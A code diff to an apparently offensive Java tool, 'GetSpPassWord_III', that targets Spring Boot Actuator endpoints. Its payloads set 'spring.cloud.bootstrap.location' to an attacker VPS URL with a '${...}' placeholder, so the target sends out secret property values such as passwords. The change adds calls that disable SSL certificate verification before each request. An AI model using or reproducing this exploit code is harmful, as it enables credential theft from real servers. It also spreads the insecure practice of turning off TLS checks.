@@ -14,6 +14,8 @@ import java.nio.charset.StandardCharsets;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import static src.main.SSLVerify.sslVer.disableSSLVerification;
+
 public class GetSpPassWord_III {
     private final String address;
     private final String vpsIP;
@@ -33,6 +35,7 @@ public class GetSpPassWord_III {
         String refsite = address +refapi;
         String expdata = "spring.cloud.bootstrap.location=http://%s/?=${%s}";
         String data = String.format(expdata,vpsIP+":"+vpsPORT,args);
+        disableSSLVerification();
         try{
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
@@ -73,6 +76,7 @@ public class GetSpPassWord_III {
         String refsite = address +refapi;
         String expdata = "{\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://%s/?=${%s}\"}";
         String data = String.format(expdata,vpsIP+":"+vpsPORT,args);
+        disableSSLVerification();
         try {
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
@@ -107,6 +111,7 @@ public class GetSpPassWord_III {
     }
     public void Exp(ResultCallback callback) throws IOException {
         String site = address + "/env";
+        disableSSLVerification();
         URL obj = new URL(site);
         HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
         conn.setRequestMethod("GET");
